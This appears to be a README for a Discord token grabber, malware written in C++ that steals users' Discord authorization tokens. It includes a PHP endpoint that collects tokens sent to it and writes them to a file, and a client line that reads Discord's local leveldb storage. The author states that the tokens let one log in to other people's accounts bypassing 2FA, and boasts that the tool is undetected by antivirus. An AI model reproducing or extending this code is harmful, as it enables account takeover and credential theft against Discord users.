# Discord Token Grabber
A Discord token grabber written in C++.

This is a "token" or authorization key finder for the platform "Discord".

You can use "tokens" to login to other people's accounts with the authorization key bypassing 2fa.

# Web
The web code is very basic and tokens can be accessed by anyone so I would recommend changing it.
```php
<?php

if(isset($_GET["t"])){
	$file = fopen("tokens.txt", "a");

	$content = file_get_contents("tokens.txt");

	if(strpos($content, $_GET["t"]) === false){
		fwrite($file, $_GET["t"].'\n');
	}
	fclose($file);
}

?>

```

# Client
This code is not very well written as I'm using C++/14 and filesystem is still experimental.
As you can see here it's a hardcoded solution but it works fine for this purpose.
```cpp
auto files = split(exec("cd %appdata%/discord/Local Storage/leveldb && dir /n /b *"), "\n");
```

# Detection
Since it's fresh and not copied it is currently undetected

![Detection](https://antiscan.me/images/result/huIT9opQ9Off.png)
